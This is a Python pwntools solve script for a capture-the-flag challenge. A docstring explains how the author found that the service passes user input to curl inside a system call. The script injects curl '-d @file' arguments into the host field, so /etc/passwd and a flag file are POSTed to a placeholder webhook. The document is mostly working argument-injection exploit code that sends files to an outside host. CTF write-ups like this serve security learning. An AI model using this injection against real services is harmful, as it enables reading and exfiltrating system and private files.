#!/usr/bin/env python3

from pwn import *

'''
*Before starting, I had to host an HTML server and set up a tunnel.*

To understand what was going on, I first had to figure out how 
the remote service worked—specifically, how the requests were made.

By hosting a simple HTML server and dumping all information about the connection (headers, etc.), 
I discovered that curl was used to fetch the page.

With that in mind, I assumed that curl was being called inside a system() function 
with my host appended. This was confirmed by a sleep 10 delay in the connection, 
which validated my assumption.

Probably the underlying command was something like 'curl HOST > /dev/null'. 
So, to exfiltrate data, I used -d @/path to make curl append the file's content as data in a POST request.

To find the username, I checked -d @/etc/passwd. 
Then, after discovering that the username was crazy_user_for_challenge, 
I exfiltrated the flag using: -d @/home/crazy_user_for_challenge/flag.txt

All the answers showed up in my server logs as POST data.
Made by GreyHat with not much love
'''

dump = []
context.log_level = 'error' # noisy output
max_len = 511
host_link = b"YOUR_WEBHOOK.com -d @/etc/passwd"
io = remote("challs.scriptsorcerers.xyz", 10313)
io.sendlineafter(b"enter host: ", host_link)
io.close()


# found in /etc/passwd
io = remote("challs.scriptsorcerers.xyz", 10313)
host_link = b"YOUR_WEBHOOK.com -d @/home/crazy_user_for_challenge/flag.txt"
io.sendlineafter(b"enter host: ", host_link)
io.close()

